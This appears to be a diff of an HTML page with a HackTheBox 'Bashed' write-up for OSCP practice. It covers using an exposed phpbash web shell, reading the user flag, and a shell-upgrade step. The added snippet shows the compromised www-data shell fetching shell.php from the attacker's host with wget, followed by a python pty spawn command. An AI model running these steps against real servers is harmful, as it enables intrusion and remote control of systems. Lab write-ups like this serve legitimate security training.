@@ -24,7 +24,7 @@
       <h1>Bashed – HackTheBox WriteUp</h1>
 
       <div class="big-to-normal-image">
-        <img src="../images/bashed1.webp" alt="Bashed Banner">
+        <img src="../images/bashed_banner.webp" alt="Bashed Banner">
       </div>
 
       <p>This write-up focuses on the Hack The Box machine “Bashed,” which is part of TJnull’s recommended list for OSCP preparation. Bashed centers on web application vulnerabilities, especially the exploitation of file upload flaws and the use of Bash scripting for privilege escalation.</p>
@@ -52,7 +52,7 @@ Nmap done: 1 IP address (1 host up) scanned in 40.12 seconds</pre>
       <p>Upon visiting the website, one detail immediately stood out — a blog post discussing phpbash, a tool known for its utility in penetration testing. This caught my attention as it hinted at potential functionality or vulnerabilities I could leverage. Given this lead, I decided to run a directory brute-forcing scan using ffuf to discover any additional accessible directories or hidden files that might be useful.</p>
 
       <div class="big-to-normal-image">
-        <img src="../images/bashed2.webp" alt="Port 80 webpage with phpbash mention">
+        <img src="../images/bashed1.webp" alt="Port 80 webpage with phpbash mention">
       </div>
 
       <h2>/Dev Directory</h2>
@@ -73,21 +73,23 @@ Nmap done: 1 IP address (1 host up) scanned in 40.12 seconds</pre>
       </div>
 
       <div class="big-to-normal-image">
-        <img src="../images/bashed3.webp" alt="/dev directory contents">
+        <img src="../images/bashed2.webp" alt="/dev directory contents">
       </div>
 
       <h2>Webshell</h2>
       <p>Upon accessing phpbash.php, I was immediately presented with an interactive web shell running with www-data privileges. This was significant, as it provided a direct line to execute commands on the server, albeit with limited permissions. With this shell, I could start navigating the file system, inspecting critical files, and gathering more information about the environment and its configuration.</p>
 
       <div class="big-to-normal-image">
-        <img src="../images/bashed4.webp" alt="phpbash web shell">
+        <img src="../images/bashed3.webp" alt="phpbash web shell">
       </div>
 
       <h2>User Flag</h2>
       <p>Next, I began exploring the system to understand my access level and permissions. Inside the home directory, I found two directories named arrexel and scriptmanager. Noticing I had read permissions for both, I examined their contents and successfully retrieved the user flag from the arrexel directory.</p>
 
       <div class="snippet">
-        <pre class="code-block">www-data@bashed:/# cd /home
+        <pre class="code-block">
+          
+www-data@bashed:/# cd /home
 www-data@bashed:/home# ls
 arrexel  scriptmanager
 www-data@bashed:/home# cd arrexel
@@ -107,6 +109,29 @@ www-data@bashed:/home/arrexel# cat user.txt
 
       <h2>Shell Upgrade</h2>
       <p>Before proceeding with privilege escalation, I needed a more stable shell for reliable interaction. To achieve this, I uploaded a shell script to the target that allowed me to establish a direct connection through my local terminal, providing a more stable and responsive environment for executing further commands and tests.</p>
+
+      <div class="snippet">
+        <pre class="code-block">
+          
+www-data@bashed:/var/www/html/dev# cd ..
+
+www-data@bashed:/var/www/html# cd uploads
+
+www-data@bashed:/var/www/html/uploads# wget 10.10.16.27/shell.php
+
+--2024-10-31 11:27:02-- http://10.10.16.27/shell.php
+Connecting to 10.10.16.27:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5493 (5.4K) [application/octet-stream]
+Saving to: 'shell.php'
+
+0K ..... 100% 30.5K=0.2s
+
+2024-10-31 11:27:03 (30.5 KB/s) - 'shell.php' saved [5493/5493]</pre>
+
+      <div class="big-to-normal-image">
+        <img src="../images/bashed4.webp" alt="phpbash web shell">
+      </div>
 
       <div class="snippet">
         <pre class="code-block">python3 -c 'import pty; pty.spawn("/bin/bash")'
